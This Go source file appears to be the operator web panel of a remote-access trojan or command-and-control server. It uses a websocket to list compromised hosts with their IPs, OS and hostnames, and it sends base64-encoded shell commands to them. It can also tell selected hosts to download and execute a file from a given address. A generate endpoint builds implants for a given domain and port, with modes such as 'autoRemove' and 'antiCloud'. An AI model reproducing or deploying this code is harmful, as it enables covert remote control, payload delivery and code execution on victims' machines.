package main

import (
	"encoding/base64"
	"fmt"
	"github.com/gorilla/websocket"
	"github.com/labstack/echo"
	"github.com/labstack/echo/middleware"
	"html/template"
	"io"
	"log"
	"net/http"
	"strings"
)

var upgrader = websocket.Upgrader{}
var wsMap []*websocket.Conn
// TemplateRenderer is a custom html/template renderer for Echo framework
type TemplateRenderer struct {
	templates *template.Template
}

func RemoveWs(i *websocket.Conn) []*websocket.Conn {
	for i2, v := range wsMap {
		if v == i {
			return append(wsMap[:i2], wsMap[i2+1:]...)
		}
	}
	//missing value
	return wsMap
}
func Broadcast(msg string) {
	for _, i := range wsMap {
		err := i.WriteMessage(websocket.TextMessage, []byte(msg))
		if err != nil {
			fmt.Println("Broadcast ws :",err.Error())
			i.Close()
		}
	}
}

// Render renders a template document
func (t *TemplateRenderer) Render(w io.Writer, name string, data interface{}, c echo.Context) error {
	// Add global methods if data is a map
	if viewContext, isMap := data.(map[string]interface{}); isMap {
		viewContext["reverse"] = c.Echo().Reverse
	}

	return t.templates.ExecuteTemplate(w, name, data)
}

func WsHandle(c echo.Context) error {
	ws, err := upgrader.Upgrade(c.Response(), c.Request(), nil)
	if err != nil {
		return err
	}
	defer func() {
		_ = ws.Close()
	}()
	wsMap = append(wsMap, ws)
	for ; ; {
		_, msg, err := ws.ReadMessage()
		if err != nil {
			return err
		}

		m := strings.Split(string(msg), "|")
		if len(m) == 1 {
			m[0] = string(msg)
		}
		fmt.Println(string(msg),m[0])
		switch m[0] {
		case "online":
			msg := fmt.Sprintf("config|%s|%s", httpPort, serverPort)
			err := ws.WriteMessage(websocket.TextMessage, []byte(msg))
			if err != nil {
				wsMap = RemoveWs(ws)
				return err
			}
			for _, v := range serverMap {
				onlineMsg := fmt.Sprintf("add|%s|%s|%s|%s|%s|%s", v.uuid, v.intIp, v.ip, v.memory, v.OS,v.hostName)
				err := ws.WriteMessage(websocket.TextMessage, []byte(onlineMsg))
				if err != nil {
					wsMap = RemoveWs(ws)
					return err
				}
			}
		case "offline":
			wsMap = RemoveWs(ws)
			return nil
		case "shell":
			var code string
			id := m[1]
			fmt.Println("id:",id,len(m))
			if len(m) == 2 {
				code = ""

			} else {
				decodeBytes, err := base64.StdEncoding.DecodeString(m[2])
				if err != nil {
					// 解码失败了，不管他.jpg
					continue
				}
				code = string(decodeBytes)
			}
			for i := range serverMap {
				if serverMap[i].uuid == string(id) {
					fmt.Println("find it.")
					if serverMap[i].status == SERVER_SHELL {
						fmt.Println("input",code)
						if code != ""{
							serverMap[i].shellInChan <- code+"\n"
						}

					} else {
						Handle(i, SERVER_SHELL)
						if code != "" {
							serverMap[i].shellInChan <- code+"\n"
						}
					}
				}
			}
		case "download":
			raw := m[1]
			var run uint16
			iid := strings.Split(raw,",")
			if len(m) != 5{
				continue
			}

			address := m[2]
			save_path := m[3]
			execute := m[4]
			if execute == "yes"{
				run = 1
			}else{
				run = 0
			}
			for _,id := range iid{
				for i := range serverMap {
					if serverMap[i].uuid == string(id) {
						fmt.Println("find it.")
						FunctionDownload(i,address,save_path,run)
					}
				}
			}
			continue
		}

	}
}
func HTTPGenerate(c echo.Context) error{
	var mod = 0
	domain := c.FormValue("domain")
	port := c.FormValue("port")
	version :=  c.FormValue("version")
	if version == "default"{
		mod = 0
	}else if version == "onlyRun"{
		mod = 1
	}else if version == "autoRemove"{
		mod = 2
	}else if version == "antiCloud"{
		mod = 3
	}else if version == "full"{
		mod = 4

	}
	File:=Generate(domain,port,mod)
	if File == ""{
		return c.String(http.StatusOK,"生成失败")
	}
	return c.File("TEMP\\"+File)
}
func Index(c echo.Context) error {
	cookie, err := c.Cookie("password")
	if err != nil {
		return c.Render(http.StatusOK,"index.html",nil)
	}
	if cookie.Value != password{
		return c.Render(http.StatusOK,"index.html",nil)
	}else{
		return c.Render(http.StatusOK, "Manager.html", nil)
	}

}

func HTTPService(port string) {
	e := echo.New()
	e.Use(middleware.Logger())
	e.Use(middleware.Recover())
	renderer := &TemplateRenderer{
		templates: template.Must(template.ParseGlob("templates/*.html")),
	}


	e.Renderer = renderer
	e.GET("/", Index)
	e.GET("/ws", WsHandle)
	e.Static("/static", "templates/static")
	e.GET("/generate",HTTPGenerate)
	log.Fatal(e.Start(port))
}
